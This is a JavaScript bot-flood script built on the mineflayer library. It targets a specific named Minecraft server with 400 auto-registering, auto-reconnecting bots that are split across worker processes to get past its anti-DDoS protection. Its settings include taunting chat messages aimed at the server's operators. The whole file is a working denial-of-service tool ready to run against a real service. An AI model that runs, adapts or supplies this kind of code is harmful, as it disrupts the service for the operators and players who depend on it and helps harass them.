const cluster = require("cluster");
const mineflayer = require("mineflayer");
const SETTINGS = {
    host: "mc.risemine.space",
    port: 25565,
    version: "1.16.5",
    totalBots: 400,
    joinDelay: 1100,
    pass: "asdasdasd",
    trashTalk: [
        "anti-ddos bypassed :smirk_cat:", "anti-cheat the best anticheat :cry:",
        "your anti-ddos = your ass", "WORST ANTI-DDOS EVER", "die",
        "hosting? nn", "try to bypass me", "oneshot is crying",
        "the world machine is crying... this is the worst code he has ever seen...",
        "neiron anticheat free download no backdoor", "neiron anticheat the best anticheat!!"
    ]
};
if (cluster.isMaster) {
    for (let i = 0; i < 2; i++) cluster.fork();
} else {
    const startOffset = cluster.worker.id === 1 ? 0 : 1;
    for (let i = startOffset; i < SETTINGS.totalBots; i += 2) {
        setTimeout(() => startBot(i), (i / 2) * SETTINGS.joinDelay);
    }
}
function startBot(id) {
    const isAnarchy = id % 2 === 0;
    const names = ["Niko", "Rue", "WorldMachine"];
    const username = names[Math.floor(Math.random() * names.length)] + "_" + Math.random().toString(36).substring(7);
    const bot = mineflayer.createBot({ host: SETTINGS.host, port: SETTINGS.port, username: username, version: SETTINGS.version, viewDistance: "tiny" });
    bot.on("spawn", () => {
        setTimeout(() => {
            bot.chat(SETTINGS.pass + " " + SETTINGS.pass);
            setTimeout(() => { bot.setQuickBarSlot(4); bot.activateItem(); }, 3000);
        }, 2000);
    });
    bot.on("windowOpen", () => {
        setTimeout(async () => {
            try { await bot.clickWindow(isAnarchy ? 13 : 15, 0, 0); } catch (e) {}
        }, 2000);
    });
    bot.on("end", () => setTimeout(() => startBot(id), 8000));
    bot.on("error", () => {});
}
